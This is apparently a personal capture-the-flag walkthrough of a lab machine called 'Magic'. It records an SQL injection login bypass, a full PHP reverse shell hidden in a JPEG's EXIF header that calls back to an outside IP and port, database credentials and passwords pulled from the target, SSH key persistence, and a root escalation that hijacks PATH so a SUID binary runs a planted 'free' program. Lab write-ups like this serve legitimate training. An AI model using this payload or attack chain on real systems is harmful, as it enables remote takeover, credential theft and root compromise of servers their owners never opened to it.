/assets (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/login.php (Status: 200)
/logout.php (Status: 302)
/upload.php (Status: 302)


* I can log in using an sqli (' or 1=1 --) on both username and password *
WHY?

* Managed to upload an image to /images/uploads/my_file_name *

* Used exiftool to hide php code in a jpeg's exif header *

exiftool -DocumentName='<?php set_time_limit (0);$VERSION = "1.0";$ip = "10.10.16.93";  $port = 7676;       $chunk_size = 1400;$write_a = null;$error_a = null;$shell = "uname -a; w; id; /bin/sh -i";$daemon = 0;$debug = 0;if (function_exists("pcntl_fork")) {	$pid = pcntl_fork();		if ($pid == -1) {		printit("ERROR: Cant fork");		exit(1);	}		if ($pid) {		exit(0); 	}		if (posix_setsid() == -1) {		printit("Error: Cant setsid()");		exit(1);	}	$daemon = 1;} else {	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");}chdir("/");umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) {	printit("$errstr ($errno)");	exit(1);}$descriptorspec = array(   0 => array("pipe", "r"),     1 => array("pipe", "w"),     2 => array("pipe", "w")   );$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) {	printit("ERROR: Cant spawn shell");	exit(1);}stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit("Successfully opened reverse shell to $ip:$port");while (1) {	if (feof($sock)) {		printit("ERROR: Shell connection terminated");		break;	}	if (feof($pipes[1])) {		printit("ERROR: Shell process terminated");		break;	}	$read_a = array($sock, $pipes[1], $pipes[2]);	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);	if (in_array($sock, $read_a)) {		if ($debug) printit("SOCK READ");		$input = fread($sock, $chunk_size);		if ($debug) printit("SOCK: $input");		fwrite($pipes[0], $input);	}	if (in_array($pipes[1], $read_a)) {		if ($debug) printit("STDOUT READ");		$input = fread($pipes[1], $chunk_size);		if ($debug) printit("STDOUT: $input");		fwrite($sock, $input);	}	if (in_array($pipes[2], $read_a)) {		if ($debug) printit("STDERR READ");		$input = fread($pipes[2], $chunk_size);		if ($debug) printit("STDERR: $input");		fwrite($sock, $input);	}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit ($string) {	if (!$daemon) {		print "$stringn";	}}?>' my_image.jpeg

* Requesting the the page that the image is uploaded make a reverse shell back to us *


* On vars/www/Magic/db.php5 credentials for mysql *
private static $dbName = 'Magic' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';


* I created a small php file (dig_db.php) that connected to mysql because i could not connect from the terminal,
then looking through the tables i found *

id: 1
username: admin
password: Th3s3usW4sK1ng


* Using the password with "Th3s3usW4sK1ng" with user "theseus" logs me in *  
python3 -c "import pty; pty.spawn('/bin/bash')"


* To work a better i created new ssh keys and uploaded the authorized key to server*
ssh-keygen



Root:
Basic enum scripts to find interesting files, after that check to see what different users do behind the scenes when you use these interesting files, with the final step: where does linux usually search for these kinds of files? Can you modify that?


Check => SUID3NUM
* Found this using SUID3NUM * ITS PROPABLY IT
/bin/sysinfo Analyse what it does!

* It calls the following commands *

lshw -short
sh -c lshw -short
fdisk -l
sh -c fdisk -l
sh -c free -h
free -h
cat /proc/cpuinfo
sh -c cat /proc/cpuinfo


* Notice the s in the permissions *
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo

* Could try to exploit the SETUID in /bin/sysinfo *
    Running ltrace /bin/sysinfo and analysing the binary a bit we see popen("free -h", "r"), notice that the 'free' binary does not specify 
    the full path '/bin/free' which means we can redirect it to use a binary we create.

    So i create a new free.c file and compile it. To have /bin/sysinfo execute my free binary file instead of another opened
    i simply set "PATH=.:${PATH}" and "export PATH". Now my path will look like this 
    .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

    The extra dot in the beggining means that the first place to look for binaries my current directory which also contains my version of "free"

    === free.c ===
    int main(int argc, char **argv) {
        setuid(0);
        system("cat /root/root.txt");
        return 0;
    }



* Executing /bin/sysinfo now will execute my version of free which will get me the root flag. 
That also means that i can write whatever c code i want with root previleges *




